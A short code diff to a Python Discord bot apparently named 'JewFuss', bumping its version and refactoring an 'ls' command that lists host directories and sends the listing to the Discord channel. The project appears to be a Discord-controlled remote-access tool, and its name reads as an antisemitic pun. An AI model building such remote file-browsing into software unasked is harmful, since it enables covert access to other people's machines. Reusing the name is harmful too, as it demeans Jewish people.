@@ -55,7 +55,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.12.3" # Replace with current JewFuss version, shows in some commands. Compiler looks for this comment for updates, so DO NOT MODIFY THIS COMMENT! - 25c75g
+version = "1.0.12.4" # Replace with current JewFuss version, shows in some commands. Compiler looks for this comment for updates, so DO NOT MODIFY THIS COMMENT! - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon (right click to see version and exit button). DO NOT MODIFY THIS COMMENT! (easy compiler looks for this) | Default: False - 28f93g
 
 starttime = time.perf_counter()
@@ -2529,7 +2529,8 @@ async def ls(ctx, path: str = None):
         else:
             response += "This directory is empty.\n"
 
-        await ctx.fm_send(f"Contents of directory: {path}", response, "directory_contents.txt", "Directory Contents.txt")
+        await ctx.fm_send(header=f"Contents of directory: {path}", content=response, filename="directory_contents.txt")
+        
     except Exception as e:
         await ctx.send(f"Error: Could not list the directory contents. {str(e)}")
 
